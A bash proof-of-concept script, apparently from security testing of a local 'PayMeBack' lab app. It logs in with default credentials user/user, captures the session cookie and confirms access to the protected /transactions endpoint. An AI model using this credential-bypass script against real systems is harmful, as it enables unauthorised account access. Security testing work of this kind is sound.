#!/bin/bash

# POC: Default Credentials Authentication Bypass (user/user)
# Target: PayMeBack application login endpoint
# Vulnerability: Hardcoded default credentials bypass authentication

TARGET_URL="http://localhost:5003"
LOGIN_ENDPOINT="/login"
TRANSACTIONS_ENDPOINT="/transactions"

echo "[*] Testing Default Credentials Authentication Bypass"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Attempt login with default credentials
echo "[+] Step 1: Attempting login with default credentials (user/user)..."
LOGIN_RESPONSE=$(curl -s -i -X POST "$TARGET_URL$LOGIN_ENDPOINT" \
  -d "username=user&password=user" \
  -c /tmp/cookies.txt)

echo "$LOGIN_RESPONSE"
echo ""

# Step 2: Check if HTTP 302 redirect is returned
if echo "$LOGIN_RESPONSE" | grep -q "302 FOUND"; then
    echo "[+] Authentication successful: HTTP 302 redirect received"
else
    echo "[-] Expected 302 redirect not found"
    exit 1
fi

# Step 3: Check for session cookie
if echo "$LOGIN_RESPONSE" | grep -q "Set-Cookie.*session"; then
    echo "[+] Valid session cookie issued"
    SESSION_COOKIE=$(grep "session=" /tmp/cookies.txt | awk '{print $NF}')
    echo "[+] Session cookie: $SESSION_COOKIE"
else
    echo "[-] No session cookie found"
    exit 1
fi

echo ""

# Step 4: Verify authenticated access to protected resource
echo "[+] Step 2: Verifying authenticated access to protected /transactions endpoint..."
PROTECTED_RESPONSE=$(curl -s -i -b /tmp/cookies.txt "$TARGET_URL$TRANSACTIONS_ENDPOINT")

echo "$PROTECTED_RESPONSE"
echo ""

# Check if we can access the protected endpoint
if echo "$PROTECTED_RESPONSE" | grep -q "200 OK"; then
    echo "[+] Successfully accessed protected endpoint with default credentials"
    echo "[+] VULNERABILITY CONFIRMED: Default credentials allow complete authentication bypass"
    exit 0
elif echo "$PROTECTED_RESPONSE" | grep -q "302"; then
    echo "[-] Still redirected to login - credentials may not have worked"
    exit 1
else
    echo "[!] Unexpected response status"
    exit 1
fi